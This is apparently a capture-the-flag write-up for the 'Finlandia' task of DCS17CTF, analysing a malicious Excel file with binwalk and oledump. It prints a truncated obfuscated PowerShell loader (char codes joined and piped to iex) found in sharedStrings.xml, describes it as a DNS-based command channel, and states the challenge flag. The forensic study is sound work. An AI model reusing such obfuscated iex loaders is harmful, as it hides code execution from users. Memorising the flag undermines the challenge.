# DCS17CTF S21Sec tasks and writeups
Tasks, scripts and writeups of most fun or interesting tasks of DCS17CTF (S21SEC)
https://challenge.s21sec.com

#### Finlandia – 400 points

![](https://i2.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/Finlandia.jpg?w=834&ssl=1)


I have an Excel suspicious file as title says and first thing is uncompress or extract contents. So use binwalk, rename as zip or whatever. Inside we have a vba bin file. We can use oledump.py to view its contents.

![](https://i0.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/fact-vba.jpg?resize=768%2C268&ssl=1)


After some time trying to decompress and decode vba bin file , seems no exit so i ‘ve start to search for other files. I have see one in particular. **sharedStrings.xml**:


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>('83G116G97B114E1...[]...C112B116B98B108C111H99H107C32G123H1'.SplIt('BHECG')|%{([Char][Int]$_)} )-Join''|iex|out-null</t></si></sst>
```

So, this is powershell obfuscated code, let’s try to see it’s contents.

![](https://i2.wp.com/blogs.tunelko.com/wp-content/uploads/2017/05/fact-ps1.jpg?resize=768%2C321&ssl=1)

It creates a DNS client to pass commands on powershell.  Flag is **f25a2fc72690b780b2a14e140ef6a9e0**





